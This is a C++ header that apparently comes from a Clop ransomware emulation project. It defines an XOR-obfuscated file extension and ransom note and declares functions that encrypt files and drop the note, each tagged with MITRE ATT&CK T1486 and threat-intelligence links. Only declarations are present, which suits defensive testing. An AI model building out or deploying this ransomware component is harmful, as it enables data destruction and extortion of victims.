#pragma once

#include <Windows.h>
#include <filesystem>
#include <format>
#include <fstream>
#include <ios>

#include "logger.hpp"
#include "xor_obfuscation.hpp"


#define FILE_EXT XOR_LIT(".C_I0p")
#define NOTE_FILENAME XOR_LIT("Readme!_CI0P!.txt")
#define NOTE XOR_LIT("ALL FILES HAVE BEEN ENCRYPTED WITH A STRONG ALGORITHM\n\nIf you want to restore your files write to us emails and attach 3-5 encrypted files\nYou will receive decrypted files\n\nYour warranty - decrypted samples!\n\nNOTHING PERSONAL IS A BUSINESS\nPLEASE DO NOT USE GMAIL IT DOES NOT REACH\nPLEASE CHECK SPAM FOLDER!!!!\n\n- Cl1p Cl0p")


namespace Encryption {

    /*
     * EncryptFileOut(const std::string filePathIn, const std::string filePathOut)
     *      About:
     *          Used by EncryptFile() to perform the actual encryption, appends, and filename change
     *      Result:
     *          A files is encrypted, written to disk, and renamed
     *      Returns:
     *          [bool] True if successful, false otherwise.
     *      MITRE ATT&CK Techniques:
     *          T1486: Data Encrypted for Impact
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    bool EncryptFileOut(const std::string filePathIn, const std::string filePathOut);

    /*
     * EncryptFile(const std::string file_path)
     *      About:
     *          Encrypts a file, then:
     *           - adds ".C_I0p" to the filename
     *           - sets the "archive" file attribute on the file
     *      Result:
     *          A file is encrypted, written to disk, and renamed
     *      Returns:
     *          [bool] True if successful, false otherwise.
     *      MITRE ATT&CK Techniques:
     *          T1486: Data Encrypted for Impact
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     *      Other References:
     *          https://www.cryptopp.com/wiki/RandomNumberGenerator#OS_GenerateRandomBlock
     */
    bool EncryptFile(const std::string file_path);

    /*
     * PerformImpact(const std::string filePath)
     *      About:
     *          Calls EncryptFile to encrypt the given file, then checks if the ransom
     *          note exists in the same directory and drops the note if not
     *      Result:
     *          A file is encrypted and the ransom note is dropped if not already present
     *      Returns:
     *          [bool] True if both steps are successful, false otherwise.
     *      MITRE ATT&CK Techniques:
     *          T1486: Data Encrypted for Impact
     *      CTI:
     *          https://www.cybereason.com/blog/research/cybereason-vs.-clop-ransomware
     *          https://sectrio.com/deconstructing-cl0p-ransomware-moveit-2023-breach/
     *          https://unit42.paloaltonetworks.com/clop-ransomware/
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    bool PerformImpact(const std::string filePath);
}